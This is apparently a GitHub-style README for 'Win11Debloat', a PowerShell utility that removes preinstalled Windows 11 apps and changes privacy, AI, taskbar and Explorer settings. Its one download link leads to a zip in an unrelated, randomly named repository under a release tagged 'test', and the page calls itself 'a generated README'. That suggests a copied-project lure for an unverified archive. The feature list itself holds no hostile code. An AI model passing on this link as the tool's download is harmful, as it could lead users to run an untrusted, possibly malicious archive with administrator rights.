# Win11Debloat

Win11Debloat is a Windows-focused PowerShell utility for decluttering and customizing a Windows 11 environment. It can remove selected preinstalled apps, adjust privacy-related settings, disable suggested content, change common interface options, and apply several system, taskbar, File Explorer, Start menu, and Windows Update preferences.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/Win11Debloat.zip)

## Overview

This repository provides a generated README for a Windows utility centered on Windows 11 debloating and configuration. The tool is intended for users who want a script-based way to apply common Windows desktop adjustments without manually changing each setting one by one.

Win11Debloat is designed around PowerShell and can be used interactively or with command-line parameters. Some changes are suitable for individual desktop users, while advanced options support applying settings to other users or preparing default profiles in deployment scenarios.

> Use at your own risk. System customization scripts can affect Windows behavior. Review options carefully before applying changes.

## Main Capabilities

Win11Debloat includes options for:

- Removing many bundled Windows apps.
- Disabling telemetry, diagnostic data, activity history, targeted ads, tips, and suggestions.
- Turning off selected AI-related Windows and Microsoft app features, including Copilot and Recall-related settings where applicable.
- Customizing Start menu, Search, Taskbar, File Explorer, and window snapping behavior.
- Adjusting system settings such as fast startup, Storage Sense, Sticky Keys shortcut, mouse acceleration, and Modern Standby network behavior.
- Changing Windows Update behavior, including update sharing and automatic restart preferences.
- Enabling optional Windows features such as Windows Sandbox and Windows Subsystem for Linux.
- Applying changes to another user profile or to the Windows default user profile through advanced modes.

## Feature Areas

### App Removal

The script can remove a range of preinstalled applications from Windows. Removed apps can generally be reinstalled through the Microsoft Store, depending on the app and system configuration.

### Privacy and Suggested Content

Available privacy-related options include disabling:

- Telemetry and diagnostic data collection.
- Activity history.
- App-launch tracking.
- Targeted advertising.
- Tips, tricks, recommendations, and promotional content.
- Location services and app location access.
- Find My Device location tracking.
- Windows Spotlight content on the lock screen or desktop.
- Microsoft Edge ads, suggestions, and news feed content.
- Microsoft 365 promotional content in Settings, or the Settings Home page itself.

### AI-Related Windows Features

Win11Debloat includes settings for reducing or disabling supported AI-related components, including:

- Microsoft Copilot.
- Windows Recall.
- Click to Do.
- WSAIFabricSvc automatic startup.
- AI features in Edge, Paint, and Notepad.

### System Adjustments

The utility includes common Windows desktop behavior changes such as:

- Restoring the Windows 10-style context menu.
- Disabling mouse acceleration.
- Disabling the Sticky Keys shortcut.
- Disabling Storage Sense automatic cleanup.
- Disabling fast startup.
- Disabling automatic BitLocker device encryption.
- Disabling network connectivity during Modern Standby.
- Disabling the Drag Tray used for sharing and moving files.

### Start Menu, Search, and Taskbar

Supported interface adjustments include:

- Removing or replacing pinned Start menu apps.
- Hiding the Recommended section.
- Hiding the All Apps section.
- Disabling Phone Link integration in Start.
- Disabling Bing web search and Copilot integration in Windows Search.
- Disabling Microsoft Store suggestions and Search Highlights.
- Clearing or disabling local Windows search history.
- Aligning taskbar icons to the left.
- Hiding or changing the taskbar search control.
- Hiding Task View, Widgets, and Chat / Meet Now icons.
- Enabling End Task from the taskbar context menu.
- Enabling Last Active Click behavior.
- Configuring taskbar behavior across multiple monitors.

### File Explorer

File Explorer options include:

- Changing the default launch location.
- Showing file extensions.
- Showing hidden files, folders, and drives.
- Hiding Home or Gallery from the navigation pane.
- Removing duplicate removable drive entries.
- Adding common folders back to This PC.
- Hiding selected folders such as 3D Objects, Music, or OneDrive.
- Removing selected context menu entries.
- Changing drive letter display behavior.

### Multitasking

The script can adjust Windows snapping behavior, including:

- Disabling window snapping.
- Disabling Snap Assist suggestions.
- Disabling Snap Layout suggestions.
- Changing whether tabs appear when snapping windows or using Alt+Tab.

### Optional Windows Features

Win11Debloat can enable:

- Windows Sandbox.
- Windows Subsystem for Linux.

### Advanced Usage

Advanced features include:

- Applying changes to a different Windows user.
- Sysprep-oriented behavior for applying changes to the Windows default user profile so new users receive selected configuration changes.

## Getting Started

Common usage patterns include:

1. Run the PowerShell-based script in an elevated Windows environment.
2. Review the available options carefully.
3. Select the changes you want to apply.
4. Reboot or sign out when required for Windows settings to take effect.

The project also supports command-line parameters for users who want repeatable or automated configuration workflows.

## Practical Use Cases

Win11Debloat may be useful for:

- Setting up a new Windows 11 installation.
- Removing unwanted bundled apps.
- Reducing suggested content and advertising surfaces.
- Preparing a cleaner Windows desktop workspace.
- Applying consistent settings across user profiles.
- Adjusting Windows defaults for power users or administrators.

## License

Win11Debloat is licensed under the MIT License. See the repository license file for details.
